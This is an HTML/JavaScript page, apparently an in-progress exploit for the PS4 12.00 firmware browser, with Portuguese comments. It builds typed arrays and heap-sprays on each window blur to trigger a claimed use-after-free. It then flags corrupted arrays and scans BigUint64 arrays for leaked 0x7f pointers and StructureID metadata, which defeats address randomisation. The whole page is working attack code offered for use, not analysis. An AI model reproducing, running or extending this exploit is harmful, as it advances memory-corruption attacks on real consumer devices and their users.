<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 12.00 Big Scan Exploit</title>
<style>
    body { font-family: sans-serif; background: #f0f0f0; color: #333; padding: 20px; }
    code { background: #e0e0e0; padding: 2px 4px; border-radius: 4px; font-family: monospace; display: block; white-space: pre-wrap; margin: 5px 0; }
    .vuln { color: #d00; font-weight: bold; }
    .pointer { color: #0077ff; font-weight: bold; }
    .metadata { color: #00aa00; font-weight: bold; }
</style>
</head>
<body>

<h1>PS4 12.00 - BIG SCAN (POINTER LEAK)</h1>

<h2>SETUP: Create Arrays</h2>
<button onclick="setup()">CREATE ALL TYPES</button>
<div id="setup"></div>

<script>
var g_arrays = {
    Float64: [], Float32: [], BigUint64: [], BigInt64: [],
    Uint32: [], Int32: [], Uint16: [], Int16: [],
    Uint8: [], Int8: []
};
var g_corrupted = {};

function setup() {
    const r = document.getElementById('setup');
    r.innerHTML = 'Creating arrays...<br>';
    const count = 500; 
    
    // Inicialização idêntica para manter estabilidade do heap
    for(let i = 0; i < count; i++) {
        g_arrays.Float64.push(new Float64Array(8));
        g_arrays.Float32.push(new Float32Array(8));
        
        let bu64 = new BigUint64Array(8);
        bu64[0] = BigInt(i); // Marker original para detecção de corrupção
        g_arrays.BigUint64.push(bu64);
        
        g_arrays.BigInt64.push(new BigInt64Array(8));
        g_arrays.Uint32.push(new Uint32Array(16));
        g_arrays.Int32.push(new Int32Array(16));
        g_arrays.Uint16.push(new Uint16Array(32));
        g_arrays.Int16.push(new Int16Array(32));
        g_arrays.Uint8.push(new Uint8Array(64));
        g_arrays.Int8.push(new Int8Array(64));
    }
    
    r.innerHTML += 'Created ' + (count * 10) + ' arrays.<br><b>Press OPTIONS twice to corrupt</b><br>';
    if(document.documentElement.webkitRequestFullscreen) document.documentElement.webkitRequestFullscreen();
    
    let triggerCount = 0;
    window.onblur = function() {
        triggerCount++;
        r.innerHTML += '<br>Trigger ' + triggerCount;
        const P = 2.121995791e-314; // Gatilho UAF
        const spray = [];
        for(let i = 0; i < 8000; i++) {
            const s = new Float64Array(10);
            s.fill(P);
            spray.push(s);
        }
        
        if(triggerCount === 2) {
            for(let type in g_arrays) {
                const corrupted = g_arrays[type].filter(a => {
                    if(type === 'BigUint64') return a[0] !== BigInt(g_arrays[type].indexOf(a));
                    if(type.includes('Big')) return a[0] === 0n;
                    if(type.includes('Float')) return a[0] === P;
                    return a[0] === 0 && g_arrays[type].indexOf(a) !== 0;
                });
                if(corrupted.length > 0) {
                    g_corrupted[type] = corrupted[0];
                    r.innerHTML += '<br><b>✓ ' + type + 'Array corrupted (' + corrupted.length + ' found)</b>';
                }
            }
            window.onblur = null;
        }
    };
}
</script>

<hr>

<h2>TEST 5: Big Scan (BigUint64 Sensors)</h2>
<p>Varredura estatística em busca de ponteiros 0x7F... e metadados.</p>
<button onclick="big_scan()">RUN BIG SCAN</button>
<div id="bigscan"></div>

<script>
function big_scan() {
    const r = document.getElementById('bigscan');
    r.innerHTML = '<b>Scanning 500 BigUint64 entries...</b><br>';

    let found_ptrs = 0;
    let found_meta = 0;

    g_arrays.BigUint64.forEach((arr, idx) => {
        const expected = BigInt(idx);
        let leaked = false;
        let log = "";

        for(let i = 0; i < arr.length; i++) {
            const val = arr[i];
            
            // Ignora o valor original e o gatilho P
            if(i === 0 && val === expected) continue;
            if(val === 0n) continue;

            leaked = true;
            let hex = "0x" + val.toString(16).padStart(16, '0');
            
            // Detecta ponteiros (Range típico PS4: 0x7f0000000000 - 0x7fffffffffff)
            if(val >= 0x7f0000000000n && val <= 0x7fffffffffffn) {
                log += `<span class="pointer">[!] PONTEIRO ENCONTRADO: ${hex} (Offset ${i*8})</span><br>`;
                found_ptrs++;
            } 
            // Detecta metadados (StructureID 0x25, 0x108)
            else if((val & 0xFFFn) === 0x108n || (val & 0xFFn) === 0x25n) {
                log += `<span class="metadata">[i] METADADOS DETECTADOS: ${hex} (Offset ${i*8})</span><br>`;
                found_meta++;
            } else {
                log += `Data: ${hex}<br>`;
            }
        }

        if(leaked) {
            r.innerHTML += `<div style="border-bottom:1px solid #ccc"><b>Array #${idx} (Corrompido):</b><br>${log}</div>`;
        }
    });

    r.innerHTML += `<br><b>Resumo: Encontrados ${found_ptrs} ponteiros e ${found_meta} metadados.</b>`;
}
</script>

</body>
</html>
